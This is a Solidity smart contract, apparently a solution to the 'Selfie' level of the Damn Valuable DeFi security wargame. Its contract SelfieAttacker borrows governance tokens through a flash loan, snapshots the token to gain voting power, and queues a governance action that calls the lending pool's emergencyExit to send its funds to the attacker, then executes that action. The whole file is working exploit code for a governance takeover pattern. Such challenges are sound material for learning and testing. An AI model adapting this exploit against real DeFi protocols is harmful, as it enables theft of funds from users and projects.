// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

contract SelfieAttacker {
    SimpleGovernance public governance;
    SelfiePool public pool;

    uint256 public actionId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _governance_address, address _pool_address) public {
        governance = SimpleGovernance(_governance_address);
        pool = SelfiePool(_pool_address);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();

        console.log("Flash loan received : %s", amount);

        actionId =  governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", initiator));

        IERC20(token).approve(msg.sender, amount);

        console.log("Success Governance Action queued : %s", actionId);

        return CALLBACK_SUCCESS;
    }

    function attack() external {
        governance.executeAction(actionId);

        console.log("Success Governance Action executed : %s", actionId);
    }

    receive() external payable {}
}